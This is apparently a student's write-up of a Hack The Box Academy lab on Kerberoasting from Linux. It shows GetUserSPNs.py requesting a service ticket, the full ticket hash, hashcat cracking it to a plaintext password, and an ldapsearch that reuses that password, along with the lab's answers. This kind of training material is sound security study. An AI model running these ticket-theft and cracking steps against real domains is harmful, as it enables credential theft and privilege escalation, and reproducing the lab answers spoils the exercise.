# Section 17: Kerberoasting - from Linux

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.

Context:
- Get the ticket
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               



┌─[htb-student@ea-attack01]─[~]
└──╼ $ls
Desktop    Downloads  Pictures  sapservice_tgs  thinclient_drives
Documents  Music      Public    Templates       Videos
┌─[htb-student@ea-attack01]─[~]
└──╼ $cat sapservice_tgs 
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$779b8acabdafc640f55aa28505af0a2e$fdf5010bcadfc7c58ce840cff3275d6cd8a73130e961435b698c634ae3207bc4d1d7d4f4254e4f9ff0c9c84fe798bfdae7c5f7d6505741be090c2757302d03702a139dd1f406b6291d46e41cb0afc18572a84a2fb819d70f00f1186d2c013376072ec5d2501cf5c7422f84da5ff55462df2529f708f0322813c5b9e323cec705be1cb8d559037fa012a091aad3e2b3d07207d7cf6cf227a34fe60d82911032ee13320410d29c94b7088261417b8a1e8beda932bc161a4765022b20050bf36907dce686b312142b85e4d75d7fb144b60057b0795df22acfae1ba74f03b2097ae89afd52a0bdf8c726f1ea0d32e5b256828cb652330611334a34b187a83db7287623f16fa46e4eb5e26801f273de9b5315b444db7bad5f232849fe75d8585bccde8c3f79e5db63d176c5208e3ff6e8f17a1a4341ef4f6b964d7ccdee2df3212f6f581a73069a51be51aa4cf8a0a214fbfcaf4eca3ef21a4c1dfe71b9248bcdf3a54e946bdef34620c1cbe24b04f77cece3964e413de51b8d48a512375b610c55adabb71e2645e559302e68f093ac51a1c3775c489b43a6a8e24552b6337a7558ba7d5c0ba44c016c611a59e113ffd7b11b5393a44644477ee85cb76f5da10cfe2e18acc156d2d98febf90cf742ce119b849193eb2b196c5994ec282d22108925eea2ba2529a9bce63f2113ae2d72f40302e70b318a5049f7658a142c45db909cdc9c4e07f729411e3bb63da0ac1d3c5e6b0f6c20f9140d9f22cc83f3a7582d62cd0fc11a35d0e66fd6dc75d178b6b2cad23528329b62338c7567f7881a1529a2dd7bd7ac24db1f5dab5185d7b4a09e57b34db06c55507c195c8fe515580a53727a5f64af2cf56463c4584d52fa2500c29be83044f619449484051d8c45e7e8655889b2ef2e26be5acb3c9b6787ef5bff65c7b5d11a735c0478aeead97b538642f4334185ab5661f430c6fcd7f8c056c51840c9956010aea37e666fab9d53ebcb93477dac8b4e2b09aa5a6c9cf78bdbf06fd2e94090fe56a730e4eff23701c05db79ef365fa79dbfe374c5eba052e868a3bc61f95d0cd32c455f07be5654dfc6c108b655192f1fb7215d72732b9bfd871012d2443ebf5baaba918a8c41e952409ecd13bc36cdc05d50fdaf77f48a1726289a86b6a2ed0d1c7745730cbe55ff0572bb4630075b779c108a1bc3a73ff91870a44b8cd97882b1d27ed5bb7e4fe91eff51b245ebe52ab6ce1e6e7caf61eebfd35fb8c157e5bc1f400834b9e6ad9fd536218210c193bd13f465cd55c1575c3cb3da24131e44b4bd8e455b90ef58551d01e0e9730197c114afba6c9c45c28ee5e4a93e8fbc8849b30d02183fcbf51492bb108e15264fdaa55d4a7318c7d1d064bd1ee9ca0eba0c1397e4719a9264e94620420aba1665f17bef7e5cbc68c0bc7054b4098
```
- Crack the ticket
```bash
┌─[eu-academy-2]─[10.10.15.48]─[htb-ac-2162140@htb-cffpvk79zs-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 13100 sapservice_tgs /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (71.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$779b8acabdafc640f55aa28505af0a2e$fdf5010bcadfc7c58ce840cff3275d6cd8a73130e961435b698c634ae3207bc4d1d7d4f4254e4f9ff0c9c84fe798bfdae7c5f7d6505741be090c2757302d03702a139dd1f406b6291d46e41cb0afc18572a84a2fb819d70f00f1186d2c013376072ec5d2501cf5c7422f84da5ff55462df2529f708f0322813c5b9e323cec705be1cb8d559037fa012a091aad3e2b3d07207d7cf6cf227a34fe60d82911032ee13320410d29c94b7088261417b8a1e8beda932bc161a4765022b20050bf36907dce686b312142b85e4d75d7fb144b60057b0795df22acfae1ba74f03b2097ae89afd52a0bdf8c726f1ea0d32e5b256828cb652330611334a34b187a83db7287623f16fa46e4eb5e26801f273de9b5315b444db7bad5f232849fe75d8585bccde8c3f79e5db63d176c5208e3ff6e8f17a1a4341ef4f6b964d7ccdee2df3212f6f581a73069a51be51aa4cf8a0a214fbfcaf4eca3ef21a4c1dfe71b9248bcdf3a54e946bdef34620c1cbe24b04f77cece3964e413de51b8d48a512375b610c55adabb71e2645e559302e68f093ac51a1c3775c489b43a6a8e24552b6337a7558ba7d5c0ba44c016c611a59e113ffd7b11b5393a44644477ee85cb76f5da10cfe2e18acc156d2d98febf90cf742ce119b849193eb2b196c5994ec282d22108925eea2ba2529a9bce63f2113ae2d72f40302e70b318a5049f7658a142c45db909cdc9c4e07f729411e3bb63da0ac1d3c5e6b0f6c20f9140d9f22cc83f3a7582d62cd0fc11a35d0e66fd6dc75d178b6b2cad23528329b62338c7567f7881a1529a2dd7bd7ac24db1f5dab5185d7b4a09e57b34db06c55507c195c8fe515580a53727a5f64af2cf56463c4584d52fa2500c29be83044f619449484051d8c45e7e8655889b2ef2e26be5acb3c9b6787ef5bff65c7b5d11a735c0478aeead97b538642f4334185ab5661f430c6fcd7f8c056c51840c9956010aea37e666fab9d53ebcb93477dac8b4e2b09aa5a6c9cf78bdbf06fd2e94090fe56a730e4eff23701c05db79ef365fa79dbfe374c5eba052e868a3bc61f95d0cd32c455f07be5654dfc6c108b655192f1fb7215d72732b9bfd871012d2443ebf5baaba918a8c41e952409ecd13bc36cdc05d50fdaf77f48a1726289a86b6a2ed0d1c7745730cbe55ff0572bb4630075b779c108a1bc3a73ff91870a44b8cd97882b1d27ed5bb7e4fe91eff51b245ebe52ab6ce1e6e7caf61eebfd35fb8c157e5bc1f400834b9e6ad9fd536218210c193bd13f465cd55c1575c3cb3da24131e44b4bd8e455b90ef58551d01e0e9730197c114afba6c9c45c28ee5e4a93e8fbc8849b30d02183fcbf51492bb108e15264fdaa55d4a7318c7d1d064bd1ee9ca0eba0c1397e4719a9264e94620420aba1665f17bef7e5cbc68c0bc7054b4098:!SapperFi2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEF...4b4098
Time.Started.....: Wed Aug 19 03:25:18 2026 (7 secs)
Time.Estimated...: Wed Aug 19 03:25:25 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1896.1 kH/s (0.70ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14342144/14344385 (99.98%)
Rejected.........: 0/14342144 (0.00%)
Restore.Point....: 14340096/14344385 (99.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: !carolyn -> !;edelritt

Started: Wed Aug 19 03:25:11 2026
Stopped: Wed Aug 19 03:25:27 2026
```

**Answer:** `!SapperFi2`

---

### 2. What powerful local group on the Domain Controller is the SAPService user a member of?

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $ldapsearch -h 172.16.5.5 -D "sapservice@INLANEFREIGHT.LOCAL" -w '!SapperFi2' -b "DC=inlanefreight,DC=local" "(sAMAccountName=sapservice)" memberOf
# extended LDIF
#
# LDAPv3
# base <DC=inlanefreight,DC=local> with scope subtree
# filter: (sAMAccountName=sapservice)
# requesting: memberOf 
#

# SAPService, Users, INLANEFREIGHT.LOCAL
dn: CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
memberOf: CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL

# search reference
ref: ldap://LOGISTICS.INLANEFREIGHT.LOCAL/DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOC
 AL

# search reference
ref: ldap://ForestDnsZones.INLANEFREIGHT.LOCAL/DC=ForestDnsZones,DC=INLANEFREI
 GHT,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.INLANEFREIGHT.LOCAL/DC=DomainDnsZones,DC=INLANEFREI
 GHT,DC=LOCAL

# search reference
ref: ldap://INLANEFREIGHT.LOCAL/CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 1
# numReferences: 4
```

**Answer:** `Account Operators`

---

[Back to Module Index](./README.md)
